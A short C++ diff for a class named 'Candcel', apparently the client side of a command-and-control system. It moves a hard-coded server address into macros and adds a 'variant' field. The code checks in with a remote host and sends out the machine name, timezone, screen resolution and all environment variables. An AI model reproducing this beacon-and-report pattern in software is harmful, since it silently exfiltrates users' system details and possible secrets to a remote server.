@@ -45,7 +45,7 @@ void Candcel::IsAlive()
 	Log::Info(L"Candcel", L"Check if server is alive");
 
 	for (int i = 0; i < 10; ++i) {
-		RestClient rc("0x17.nl", "avc_endpoint.php");
+		RestClient rc(AVC_HOST, AVC_ENDPOINT);
 
 		rc.Call(RestClientCommand::CM_CLIENT_PING, new JSONValue);
 
@@ -78,7 +78,7 @@ DWORD Candcel::CheckIn()
 
 		Log::Info(L"Candcel", L"Sending checkin request");
 
-		RestClient rc("0x17.nl", "avc_endpoint.php");
+		RestClient rc(AVC_HOST, AVC_ENDPOINT);
 
 		JSONObject obj;
 		obj[L"guid"] = new JSONValue(Config::Current()->Guid());
@@ -112,7 +112,7 @@ void Candcel::Solicit()
 {
 	Log::Info(L"Candcel", L"Notify the server of this instance");
 
-	RestClient rc("0x17.nl", "avc_endpoint.php");
+	RestClient rc(AVC_HOST, AVC_ENDPOINT);
 
 	std::map<std::wstring, std::wstring> *lEnv = Util::EnvVariables();
 
@@ -133,6 +133,7 @@ void Candcel::Solicit()
 	obj[L"computer"] = new JSONValue(Util::machine());
 	obj[L"resolution"] = new JSONValue(Util::windowResolution());
 	obj[L"timezone"] = new JSONValue(Util::timezoneName());
+	obj[L"variant"] = new JSONValue(Config::Current()->DisplayName());
 	obj[L"env"] = new JSONValue(env);
 
 	rc.Call(RestClientCommand::CM_CLIENT_SOLICIT, new JSONValue(obj));
@@ -177,7 +178,7 @@ void Candcel::CheckForUpdate()
 
 	Log::Info(L"Candcel", L"Check for update");
 
-	RestClient rc("0x17.nl", "avc_endpoint.php");
+	RestClient rc(AVC_HOST, AVC_ENDPOINT);
 
 	JSONObject obj;
 	obj[L"build"] = new JSONValue((double)clientVersion);
